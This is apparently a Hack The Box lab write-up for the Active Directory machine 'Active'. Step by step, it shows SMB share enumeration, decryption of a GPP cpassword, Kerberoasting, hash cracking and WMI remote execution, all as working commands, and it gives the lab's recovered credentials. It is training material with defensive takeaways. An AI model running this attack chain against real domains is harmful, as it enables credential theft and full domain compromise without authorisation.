# 🔴 HTB Writeup – Active
# 📌 Overview

Machine Name: Active

Difficulty: Easy

Category: Active Directory / Windows

Key Techniques:

SMB Anonymous Access

Group Policy Preferences (GPP) Credential Extraction

Kerberoasting

Hash Cracking

Remote Code Execution via WMI

# 🧠 Attack Path Summary


Full port and service enumeration → Identify Domain Controller

SMB enumeration → Anonymous access to SYSVOL

Extract GPP cpassword → Recover service account credentials

LDAP enumeration → Identify Kerberoastable users

Kerberoasting → Extract service ticket hash

Crack hash → Obtain Administrator credentials

WMI execution → SYSTEM access → Root

# 🔍 Enumeration

# 🔹 Nmap Scan
```
sudo nmap -Pn -p- -T4 -sS -sV -sC \
  --script "default,vuln,smb-vuln*,ftp-anon,ftp-syst,ftp-bounce,http-methods,http-enum,http-webdav-scan" \
  --script-timeout 20s --max-retries 2 \
  -oA nmap_full 10.129.18.70
```
<img width="1084" height="445" alt="image" src="https://github.com/user-attachments/assets/c5e98040-5c3f-475f-abeb-3a168712c6cc" />

# 🔹 Autorecon
```autorecon 10.129.18.70 \
-m 100 \
-mp 20 \
-o autorecon_vm3 \
--dirbuster.tool feroxbuster \
--dirbuster.threads 50 \
-v
```

<img width="815" height="439" alt="image" src="https://github.com/user-attachments/assets/0ce4a63c-b9c8-44e6-8db5-b2ada4e66939" />


# 🧩 Key Findings


SMB (445) open

LDAP (389) open

Kerberos (88) open

Host behaves like a Domain Controller

# 📂 SMB Enumeration

# 🔹 Anonymous Login
```
smbclient -L //10.129.18.70 -N
```

<img width="1046" height="473" alt="image" src="https://github.com/user-attachments/assets/dc940062-ad32-4c1e-825b-fc1f5bf05fa9" />


<img width="744" height="287" alt="image" src="https://github.com/user-attachments/assets/f4a3a031-e624-4da9-b516-14f0f5a3e2bd" />

✔ Anonymous access allowed

# 🔹 Access Shares

```
smbclient //10.129.18.70/Replication -N
```

<img width="724" height="311" alt="image" src="https://github.com/user-attachments/assets/4af6a50f-efcf-4e48-b69d-d0c53263003f" />

Access to Replication share confirmed
Users share initially inaccessible


🔹 Locate GPP Credentials

Navigated to:

```
/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```

<img width="2441" height="274" alt="image" src="https://github.com/user-attachments/assets/716b986d-2bb8-4d31-b11b-726cfc13b96b" />


🔹 Extract cpassword

```
gpp-decrypt "$(grep -oP 'cpassword="\K[^"]+' ./active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml)"
```

<img width="2451" height="103" alt="image" src="https://github.com/user-attachments/assets/c15ffde8-d219-4369-b9d6-17a13ecdddba" />

<img width="1231" height="99" alt="image" src="https://github.com/user-attachments/assets/3e9b31ad-59d1-4e77-878a-8c1f0304864a" />

<img width="1230" height="344" alt="image" src="https://github.com/user-attachments/assets/ea64496f-2e00-46f5-8ae5-ac3c3673bf42" />

<img width="1246" height="138" alt="image" src="https://github.com/user-attachments/assets/76aeebff-d970-4656-aa2c-46e0d1fb3200" />

🔑 Credentials Recovered

SVC_TGS : GPPstillStandingStrong2k18

🔹 Re-Enumerate SMB with Credentials

```
smbclient -L //10.129.18.70 -U SVC_TGS
```
<img width="775" height="289" alt="image" src="https://github.com/user-attachments/assets/13fad62c-19d2-4bc1-b3e3-0e1aa2e540bf" />


✔ Now able to access additional shares, including Users

🏁 User Flag

Located in:

C:\Users\<user>\Desktop\user.txt

🚀 Privilege Escalation

🔹 LDAP Enumeration

```
ldapsearch -x -H ldap://10.129.19.56 \
-D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' \
-b "dc=active,dc=htb" \
-s sub "(&(objectCategory=person)(objectClass=user)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))" \
samaccountname | grep sAMAccountName
```

<img width="865" height="201" alt="image" src="https://github.com/user-attachments/assets/348a1f49-4b80-417f-92c8-323355ccf247" />

🧩 Findings

Multiple users identified

Administrator account active

SVC_TGS account present

🔹 Kerberoasting

```
GetUserSPNs.py active.htb/svc_tgs:'GPPstillStandingStrong2k18' -dc-ip 10.129.19.56
```

<img width="2195" height="160" alt="image" src="https://github.com/user-attachments/assets/9367dd0d-859c-4406-ab41-4aa739848d4b" />


🔹 Request Service Ticket

```
GetUserSPNs.py active.htb/svc_tgs:'GPPstillStandingStrong2k18' \
-dc-ip 10.129.19.56 -request
```

<img width="2433" height="315" alt="image" src="https://github.com/user-attachments/assets/29d27383-749a-42c2-bdee-0dc9036e946f" />


✔ Extracted Kerberos service ticket hash

🔹 Crack Hash

```
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force
```

<img width="764" height="173" alt="image" src="https://github.com/user-attachments/assets/ad1d8841-ab73-4b53-a45f-b35d8648ec79" />


🔑 Credentials Recovered

Administrator : Ticketmaster1968
🔹 Remote Code Execution (WMI)

```
wmiexec.py active.htb/administrator:Ticketmaster1968@10.129.19.56
```

✔ SYSTEM-level access obtained

🏁 Root Flag

```
C:\Users\Administrator\Desktop\root.txt
```

<img width="594" height="140" alt="image" src="https://github.com/user-attachments/assets/7a351e17-93b4-474e-9404-89ea22785775" />


🧠 Key Takeaways

GPP Credentials are still a real-world risk

Misconfigured SYSVOL can expose plaintext creds

Anonymous SMB access is dangerous

Always check for readable shares early

Kerberoasting remains highly effective

Weak service account passwords = full domain compromise

Attack Chain Matters

Enumeration → Credential Access → Priv Esc → Execution

🔁 Alternative Paths

BloodHound enumeration (if creds obtained earlier)

Crack other SPNs if multiple exist

SMB relay (if signing disabled)

🧰 Tools Used
Nmap

Autorecon

smbclient

gpp-decrypt

ldapsearch

Impacket (GetUserSPNs.py, wmiexec.py)

Hashcat

📌 Final Thoughts

This machine is a perfect example of:

Why misconfigurations in AD environments are critical

How small leaks (GPP) lead to domain compromise

The importance of chaining techniques together
